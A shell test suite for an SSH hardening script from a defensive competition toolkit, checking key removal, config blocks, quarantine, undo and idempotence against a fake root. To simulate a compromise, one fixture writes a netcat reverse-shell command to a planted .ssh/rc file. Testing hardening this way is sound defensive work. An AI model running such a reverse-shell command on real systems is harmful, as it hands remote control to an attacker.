#!/bin/sh
# Tests for roles/linux/LX-22-ssh-hardening.sh.
# Works on a fake root (--root) with a stand-in sshd ("sshd -t -f FILE"
# passes unless SSHD_REJECT=1), so the real SSH server is never touched.
# Keys are made with ssh-keygen when it exists.  Checks: dry run changes
# nothing; --apply keeps team keys and removes the rest (evidence kept),
# also in a service account's home; the settings block goes on top; rc files
# are quarantined; a protected account keeps its keys; a config sshd rejects
# is never installed; undo restores the files; a second run changes nothing.
. "$(dirname "$0")/helper.sh"
SH=${TEST_SHELL:-sh}
C="$T_ROOT/roles/linux/LX-22-ssh-hardening.sh"
export CCDC_SKIP_VERIFY=1
# shellcheck disable=SC2086
run() { $SH "$C" "$@"; }
O="$T_TMP/out"; R="$T_TMP/root"; B="$T_TMP/bin"; K="$T_TMP/keys"
mkdir -p "$O" "$B" "$K"
cat >"$B/sshd" <<'STUB'
#!/bin/sh
# stand-in sshd: -t passes unless SSHD_REJECT=1
[ "$1" = -t ] || exit 1
[ "${SSHD_REJECT:-0}" = 1 ] && { echo "Bad configuration option: Planted" >&2; exit 255; }
exit 0
STUB
chmod +x "$B/sshd"
CCDC_SSHD="$B/sshd"; export CCDC_SSHD

if ! command -v ssh-keygen >/dev/null 2>&1; then
    t_start "ssh-keygen missing: LX-22 key tests skipped"
    t_done; exit 0
fi
for k in team evil www; do ssh-keygen -q -t ed25519 -N '' -C "$k" -f "$K/$k"; done

plant() {
    rm -rf "$R"; mkdir -p "$R/etc/ssh" "$R/home/alice/.ssh" "$R/home/bob/.ssh" "$R/var/www/.ssh"
    printf 'root:x:0:0::/root:/bin/bash\nalice:x:1000:1000::/home/alice:/bin/bash\nbob:x:1001:1001::/home/bob:/bin/bash\nwww-data:x:33:33::/var/www:/usr/sbin/nologin\n' >"$R/etc/passwd"
    printf 'Include /etc/ssh/sshd_config.d/*.conf\nPort 22\nX11Forwarding yes\nPermitRootLogin yes\nMatch User bob\n    PermitEmptyPasswords yes\n' >"$R/etc/ssh/sshd_config"
    { echo '# alice keys'; cat "$K/team.pub"; cat "$K/evil.pub"; } >"$R/home/alice/.ssh/authorized_keys"
    cat "$K/evil.pub" >"$R/home/bob/.ssh/authorized_keys"
    { printf 'command="/tmp/x" '; cat "$K/www.pub"; } >"$R/var/www/.ssh/authorized_keys"
    printf 'nc -e /bin/sh 10.6.6.6 4444\n' >"$R/home/alice/.ssh/rc"
    cp "$R/etc/ssh/sshd_config" "$T_TMP/sshd_config.orig"
    cp "$R/home/alice/.ssh/authorized_keys" "$T_TMP/alice_keys.orig"
}
printf 'type,value,note\naccount,bob,scoring logs in with a key\n' >"$T_TMP/protected.csv"

t_start "options"
run --allow-keys "$K/team.pub" --remove-all-keys >/dev/null 2>&1; t_eq "$?" 2 "--allow-keys with --remove-all-keys exits 2"
run --allow-keys "$T_TMP/none.pub" >/dev/null 2>&1; t_eq "$?" 2 "missing allow file exits 2"

t_start "dry run changes nothing"
plant
out=$(run --out "$O" --root "$R" --allow-keys "$K/team.pub" 2>&1); rc=$?
t_eq "$rc" 0 "exit 0"
t_ok "sshd_config unchanged" cmp -s "$R/etc/ssh/sshd_config" "$T_TMP/sshd_config.orig"
t_ok "keys unchanged" cmp -s "$R/home/alice/.ssh/authorized_keys" "$T_TMP/alice_keys.orig"
t_has "$out" "would install (passed sshd -t)" "config would be installed"
t_has "$out" "Match block [Match User bob] sets:" "loosening Match block reported"
t_has "$out" "has options [command=" "forced-command key reported"

t_start "--apply"
out=$(run --out "$O" --root "$R" --allow-keys "$K/team.pub" --protected "$T_TMP/protected.csv" --apply 2>&1); rc=$?
t_eq "$rc" 0 "exit 0"
ak=$(cat "$R/home/alice/.ssh/authorized_keys")
t_has "$ak" "$(cut -d' ' -f2 "$K/team.pub")" "team key kept"
t_hasnt "$ak" "$(cut -d' ' -f2 "$K/evil.pub")" "planted key removed"
t_has "$ak" "# alice keys" "comment lines kept"
t_hasnt "$(cat "$R/var/www/.ssh/authorized_keys")" "$(cut -d' ' -f2 "$K/www.pub")" "key in a service account's home removed"
t_has "$(cat "$R/home/bob/.ssh/authorized_keys")" "$(cut -d' ' -f2 "$K/evil.pub")" "protected account keeps its keys"
ev=$(find "$O/quarantine" -name 'authorized_keys.removed' -path '*alice*' | head -n 1)
t_has "$(cat "$ev" 2>/dev/null)" "$(cut -d' ' -f2 "$K/evil.pub")" "removed key kept as evidence"
t_fail ".ssh/rc quarantined" test -e "$R/home/alice/.ssh/rc"
cfg=$(cat "$R/etc/ssh/sshd_config")
t_eq "$(head -n 1 "$R/etc/ssh/sshd_config")" "# >>> CCDC LX-22 (sshd uses the first value it reads, so this block wins)" "block is at the top"
t_has "$cfg" "PermitEmptyPasswords no" "empty passwords off"
t_has "$cfg" "PermitRootLogin prohibit-password" "root by key only"
t_has "$cfg" "X11Forwarding yes" "original lines kept below the block"
t_has "$out" "skipped (--no-reload or --root)" "no reload with --root"

t_start "a second run changes nothing"
out=$(run --out "$O" --root "$R" --allow-keys "$K/team.pub" --protected "$T_TMP/protected.csv" --apply 2>&1)
t_has "$out" "sshd_config: already in place" "config already in place"
t_has "$out" "0 removed" "no more keys to remove"
t_eq "$(grep -c 'CCDC LX-22' "$R/etc/ssh/sshd_config")" 2 "only one block"

t_start "undo"
U=$(ls "$O"/undo-*.log)
awk -F'\t' '{ l[NR] = $4 } END { for (i = NR; i >= 1; i--) print l[i] }' "$U" >"$T_TMP/undo.sh"
sh "$T_TMP/undo.sh" >/dev/null 2>&1
t_ok "sshd_config restored" cmp -s "$R/etc/ssh/sshd_config" "$T_TMP/sshd_config.orig"
t_ok "authorized_keys restored" cmp -s "$R/home/alice/.ssh/authorized_keys" "$T_TMP/alice_keys.orig"
t_file "$R/home/alice/.ssh/rc" "rc file put back"
rm -f "$U"

t_start "a config sshd rejects is never installed"
plant
out=$(SSHD_REJECT=1; export SSHD_REJECT; run --out "$O" --root "$R" --apply --no-protected 2>&1); rc=$?
t_eq "$rc" 5 "exit 5"
t_ok "sshd_config unchanged" cmp -s "$R/etc/ssh/sshd_config" "$T_TMP/sshd_config.orig"
t_has "$out" "sshd rejected the new config" "says why"

t_start "other options"
plant
run --out "$O" --root "$R" --apply --no-protected --no-root-login --no-forwarding --allow-users "alice" --protected "$T_TMP/protected.csv" --remove-all-keys >/dev/null 2>&1
cfg=$(cat "$R/etc/ssh/sshd_config")
t_has "$cfg" "PermitRootLogin no" "--no-root-login"
t_has "$cfg" "AllowTcpForwarding no" "--no-forwarding"
t_has "$cfg" "AllowUsers alice bob" "--allow-users adds the protected account"
t_eq "$(grep -c . "$R/home/alice/.ssh/authorized_keys")" 1 "--remove-all-keys leaves only the comment"
t_done
